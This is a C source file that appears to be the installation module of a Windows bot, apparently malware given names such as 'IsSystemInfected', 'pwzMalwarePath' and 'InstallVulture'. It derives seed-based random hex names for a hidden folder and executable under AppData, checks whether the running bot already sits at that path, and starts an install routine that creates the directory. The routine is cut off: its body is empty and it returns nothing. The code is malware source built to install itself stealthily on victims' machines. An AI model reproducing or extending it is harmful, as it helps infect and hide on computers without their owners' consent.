#include "install.h"

#include "../common/string.h"
#include "../common/utils.h"
#include "../common/mem.h"

#include <Shlobj.h>

#include "bot.h"

extern bot_t bot;

LPWSTR Install_GenerateFileName(DWORD dwNameSeed)
{
	DWORD dwFileNameSeed, dwFileName, dwFileNameLength;
	wchar_t wzFileName[32];

	if((dwFileNameSeed = Bot_GenerateSeed(dwNameSeed)) == 0)
		return 0;
	
	if((dwFileName = Utils_RandomNumber(dwFileNameSeed)) == 0)
		return 0;
	
	memzero(&wzFileName, sizeof(wzFileName));
	
	if((dwFileNameLength = CWA(wsprintfW)(wzFileName, L"%x", dwFileName)) > 0)
	{
		return StrCopyW(wzFileName, dwFileNameLength);
	}

	return 0;
}

LPWSTR Install_GenerateDirectoryPath(void)
{
	LPWSTR pwzAppData, pwzDirectoryName;
	BOOL bSuccess;

	if((pwzDirectoryName = Install_GenerateFileName(BOT_FOLDER_NAME_SEED)) == 0)
		return 0;

	bSuccess = FALSE;

	if((pwzAppData = Utils_GetPath(PATH_APPDATA)) != 0)
	{
		bSuccess = StrConcatW(&pwzAppData, pwzDirectoryName);
	}

	memfree(pwzDirectoryName);

	if(!bSuccess)
	{
		memfree(pwzAppData);
		pwzAppData = 0;
	}

	return pwzAppData;
}

LPWSTR Install_GenerateBotPath(void)
{
	LPWSTR pwzBotDir, pwzFileName;
	BOOL bSuccess;

	if((pwzFileName = Install_GenerateFileName(BOT_FILE_NAME_SEED)) == 0)
		return 0;

	bSuccess = FALSE;

	if((pwzBotDir = Install_GenerateDirectoryPath()) != 0)
	{
		bSuccess = StrConcatW(&pwzBotDir, L"\\") && StrConcatW(&pwzBotDir, pwzFileName) && StrConcatW(&pwzBotDir, L".exe");
	}

	memfree(pwzFileName);

	if(!bSuccess)
	{
		memfree(pwzBotDir);
		pwzBotDir = 0;
	}

	return pwzBotDir;
}

BOOL IsSystemInfected(void)
{
	BOOL bIsInfected;
	LPWSTR pwzMalwarePath;
	
	if ((pwzMalwarePath = Install_GenerateBotPath()) == 0)
	{
		return FALSE;
	}

	bIsInfected = StrCompareW(bot.wzBotPath, pwzMalwarePath);

	memfree(pwzMalwarePath);

	return bIsInfected;
}

BOOL InstallVulture(void)
{
	LPWSTR pwzBotPath, pwzBotDirPath;

	if((pwzBotDirPath = Install_GenerateDirectoryPath()) == 0)
		return FALSE;

	if((pwzBotPath = Install_GenerateBotPath()) != 0)
	{
		if(File_CreateDirectory(pwzBotDirPath))
		{
			
		}
	}
}